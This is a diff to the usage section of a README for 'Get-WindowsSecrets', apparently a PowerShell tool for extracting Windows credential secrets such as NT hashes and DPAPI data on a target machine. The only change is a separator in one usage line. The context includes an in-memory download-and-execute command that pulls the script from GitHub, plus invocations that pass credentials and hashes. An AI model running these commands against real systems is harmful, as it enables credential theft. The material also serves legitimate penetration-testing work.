@@ -41,7 +41,7 @@ Download the script on target and from Powershell:
 ```
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")
 . <Path>\Get-WindowsSecrets.ps1;
-Get-WindowsSecrets -Creds <User1>:<Pwd1>:<User2>:<Pwd2>
+Get-WindowsSecrets -Creds <User1>:<Pwd1>/<User2>:<Pwd2>
 Get-WindowsSecrets -NTHashes <User>:<NTHash>
 Get-WindowsSecrets -Creds <User>:<Pwd> -NTHashes <User1>:<NTHash1>/<User2>:<NTHash2>
 Get-WindowsSecrets -SkipDPAPI $True
